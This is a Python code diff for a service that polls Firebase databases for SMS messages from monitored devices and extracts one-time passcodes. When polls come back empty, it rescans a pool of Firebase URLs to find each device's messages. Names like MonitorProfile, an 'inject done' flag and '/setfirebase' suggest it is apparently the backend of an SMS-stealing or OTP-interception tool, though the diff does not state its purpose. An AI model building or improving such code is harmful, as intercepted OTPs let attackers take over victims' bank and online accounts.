@@ -113,6 +113,8 @@ BASELINE_READY_META_KEY = "firebase_sms_baseline_ready"
 MESSAGES_HIGH_WATER_META = "firebase_messages_high_water"
 SMS_FIREBASE_URL_META_KEY = "firebase_sms_poll_url"
 POOL_SMS_SCAN_DONE_META_KEY = "firebase_pool_sms_scan_done"
+OTP_EMPTY_POLL_STREAK_META_KEY = "otp_empty_poll_streak"
+EMPTY_POLL_RESCAN_AFTER = 3
 SMS_PATHS_META_KEY = "firebase_sms_paths"
 MAX_SEEN_KEYS = 20000
 MAX_CACHED_SMS_PATHS = 50
@@ -227,6 +229,8 @@ async def resolve_firebase_url_for_otp_poll(
     profile: MonitorProfile,
     device: Device,
     db,
+    *,
+    force_pool_scan: bool = False,
 ) -> str | None:
     """Pick the Firebase DB that actually has messages/{device} (pool vs /setfirebase)."""
     from app.firebase_client import normalize_firebase_url
@@ -239,17 +243,27 @@ async def resolve_firebase_url_for_otp_poll(
     candidates = _firebase_url_candidates(profile, device)
     meta = _meta_dict(device)
 
+    cached = meta.get(SMS_FIREBASE_URL_META_KEY)
+    if isinstance(cached, str) and cached.strip() and not force_pool_scan:
+        if await _messages_path_exists(cached, device_id, timeout=timeout):
+            return normalize_firebase_url(cached)
+        meta.pop(SMS_FIREBASE_URL_META_KEY, None)
+
     for url in candidates:
         if await _messages_path_exists(url, device_id, timeout=timeout):
             if normalize_firebase_url(device.firebase_source_url or "") != url:
                 device.firebase_source_url = url
             meta[SMS_FIREBASE_URL_META_KEY] = url
+            meta[OTP_EMPTY_POLL_STREAK_META_KEY] = 0
             _save_meta(device, meta)
             db.commit()
             logger.info("OTP poll DB resolved device=%s url=%s", device_id, url)
             return url
 
-    if not meta.get(POOL_SMS_SCAN_DONE_META_KEY):
+    if force_pool_scan:
+        meta.pop(POOL_SMS_SCAN_DONE_META_KEY, None)
+
+    if not meta.get(POOL_SMS_SCAN_DONE_META_KEY) or force_pool_scan:
         pool_hit = await _scan_pool_for_device_messages(
             db,
             device_id,
@@ -259,6 +273,7 @@ async def resolve_firebase_url_for_otp_poll(
         if pool_hit:
             device.firebase_source_url = pool_hit
             meta[SMS_FIREBASE_URL_META_KEY] = pool_hit
+            meta[OTP_EMPTY_POLL_STREAK_META_KEY] = 0
             _save_meta(device, meta)
             db.commit()
             return pool_hit
@@ -270,7 +285,7 @@ async def resolve_firebase_url_for_otp_poll(
         device_id,
         len(candidates),
     )
-    return candidates[0] if candidates else None
+    return None
 
 
 def _resolve_device_firebase_url(profile: MonitorProfile, device: Device) -> str | None:
@@ -382,7 +397,25 @@ def clear_sms_baseline(device: Device) -> None:
     meta.pop(INJECT_DONE_META_KEY, None)
     meta.pop(SMS_FIREBASE_URL_META_KEY, None)
     meta.pop(POOL_SMS_SCAN_DONE_META_KEY, None)
+    meta.pop(OTP_EMPTY_POLL_STREAK_META_KEY, None)
     _save_meta(device, meta)
+
+
+def _bump_empty_poll_streak(device: Device, db) -> int:
+    meta = _meta_dict(device)
+    streak = int(meta.get(OTP_EMPTY_POLL_STREAK_META_KEY) or 0) + 1
+    meta[OTP_EMPTY_POLL_STREAK_META_KEY] = streak
+    _save_meta(device, meta)
+    db.commit()
+    return streak
+
+
+def _reset_empty_poll_streak(device: Device, db) -> None:
+    meta = _meta_dict(device)
+    if meta.get(OTP_EMPTY_POLL_STREAK_META_KEY):
+        meta[OTP_EMPTY_POLL_STREAK_META_KEY] = 0
+        _save_meta(device, meta)
+        db.commit()
 
 
 def _leaf_push_int(firebase_key: str) -> int | None:
@@ -1473,31 +1506,35 @@ async def _poll_messages_otp_only(
     try:
         records, hit_paths = await asyncio.wait_for(
             _fetch_paths_parallel(root, paths, timeout=fetch_timeout),
-            timeout=fetch_timeout + 0.5,
+            timeout=fetch_timeout + 1.5,
         )
         if hit_paths:
             set_cached_sms_paths(device, hit_paths)
     except (asyncio.TimeoutError, Exception) as exc:
         logger.warning("OTP poll paths failed device=%s: %s", device_id, exc)
         records = []
+    if not records:
+        records = await _fetch_path_records(root, f"messages/{device_id}", fetch_timeout)
     records = _dedupe_records(records)
     if not records:
-        meta = _meta_dict(device)
-        if meta.pop(SMS_FIREBASE_URL_META_KEY, None):
-            _save_meta(device, meta)
-            db.commit()
-        alt_url = await resolve_firebase_url_for_otp_poll(profile, device, db)
+        streak = _bump_empty_poll_streak(device, db)
+        force_pool = streak >= EMPTY_POLL_RESCAN_AFTER
+        if force_pool:
+            logger.warning(
+                "OTP poll empty x%s device=%s — rescan full Firebase pool",
+                streak,
+                device_id,
+            )
+        alt_url = await resolve_firebase_url_for_otp_poll(
+            profile,
+            device,
+            db,
+            force_pool_scan=force_pool,
+        )
         if alt_url and alt_url != firebase_url:
             root = firebase_root_url(alt_url)
             firebase_url = alt_url
-            try:
-                records, _ = await _fetch_paths_parallel(
-                    root,
-                    _build_hot_poll_paths(device),
-                    timeout=fetch_timeout,
-                )
-            except Exception:
-                records = []
+            records = await _fetch_path_records(root, f"messages/{device_id}", fetch_timeout)
             records = _dedupe_records(records)
     if not records:
         logger.warning("OTP poll empty device=%s url=%s", device_id, firebase_url)
@@ -1590,7 +1627,9 @@ async def _poll_messages_otp_only(
             push_id,
         )
 
-    if not delivered and candidates:
+    if delivered:
+        _reset_empty_poll_streak(device, db)
+    elif candidates:
         db.commit()
     return delivered
 
